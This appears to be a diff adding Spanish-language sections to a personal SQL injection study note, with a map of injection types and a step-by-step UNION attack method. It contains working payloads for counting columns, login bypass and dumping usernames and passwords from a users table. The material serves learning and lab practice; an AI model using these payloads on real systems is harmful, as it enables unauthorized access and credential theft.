@@ -9,6 +9,13 @@
 - 📄 **Cheat sheet** — sintaxis por motor (concat, substring, comentarios, versión, contenidos, errores condicionales, time delays, DNS/OAST…): [cheat-sheet.md](cheat-sheet.md)
 - 🕶️ **Ofuscación SQL** (bypass de WAF): [[vulnerabilities/019-obfuscacion/sql-obfuscation|sql-obfuscation]]
 
+## 🗂️ Tipos de SQLi (mapa)
+
+- **Recuperación directa (in-band):** el dato **vuelve en la respuesta**. Ej.: mostrar registros ocultos vía `WHERE` (`' OR 1=1--`) o **login bypass** (`administrator'--`). → metodología abajo.
+- **UNION-based:** agregás tu propio `SELECT` para volcar **otras tablas** en la respuesta visible. → sección **UNION attacks**.
+- **Blind:** **no ves** el dato; lo inferís por **booleano / error / tiempo / OAST**. → sección **Blind SQLi**.
+- **Escritura (menos común):** `UPDATE` / `INSERT` / stacked queries → **modificar** la base, no solo leerla. → callout al final.
+
 ## 🧪 Cómo explotar (metodología)
 
 1. **Confirmar la inyección:** romper con `'`; observar error o cambio de comportamiento. Calibrar con `OR 1=1` / `AND 1=2`.
@@ -18,6 +25,41 @@
 5. **Si es blind, escalar el oráculo en este orden:** `error-based` → `time-based` → `OAST / Collaborator`.
    - Booleano si la respuesta cambia; error condicional si no; retardo de tiempo si tampoco; out-of-band (DNS/HTTP) como último recurso.
 6. **Filtro / WAF:** ofuscar el payload (entidades HTML/numéricas, tab *Hackvertor*) → ver [[vulnerabilities/019-obfuscacion/sql-obfuscation|sql-obfuscation]].
+
+## 🔗 UNION attacks — vectores directos
+
+> Cuando el dato **vuelve en la respuesta**: agregás `UNION SELECT` para traer columnas de otras tablas.
+> **Requisitos:** mismo **número de columnas** y **tipos de dato compatibles** entre las dos consultas.
+> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos.
+
+**1) Contar columnas** (dos técnicas):
+
+`ORDER BY` — subís el número hasta que da error:
+<pre><code>' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--     ← error = te pasaste; la última que funcionó = nº de columnas</code></pre>
+
+`UNION SELECT NULL` — agregás NULL hasta que **deja** de dar error:
+<pre><code>' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--</code></pre>
+
+Oracle exige `FROM`:
+<pre><code>' UNION SELECT NULL FROM dual--</code></pre>
+
+**2) Encontrar la columna que acepta texto** (para volcar strings) — reemplazás cada NULL por `'a'`; la que **no** da error sirve:
+<pre><code>' UNION SELECT '<mark>a</mark>',NULL,NULL,NULL--
+' UNION SELECT NULL,'<mark>a</mark>',NULL,NULL--
+' UNION SELECT NULL,NULL,'<mark>a</mark>',NULL--
+' UNION SELECT NULL,NULL,NULL,'<mark>a</mark>'--</code></pre>
+
+**3) Volcar datos** en la(s) columna(s) útil(es):
+<pre><code>' UNION SELECT <mark>username</mark>,<mark>password</mark> FROM <mark>users</mark>--</code></pre>
+
+Varios valores en **una sola** columna (concatenar):
+<pre><code>' UNION SELECT <mark>username</mark>||'~'||<mark>password</mark> FROM <mark>users</mark>--</code></pre>
+
+**¿Qué volcar (versión, tablas, columnas)?** ya está en [cheat-sheet.md](cheat-sheet.md) → *Database version* (`@@version`, etc.) y *Database contents* (`information_schema.tables/columns`; Oracle `all_tables` / `all_tab_columns`). No lo repito acá.
 
 ## 🕵️ Blind SQLi — vectores directos
 
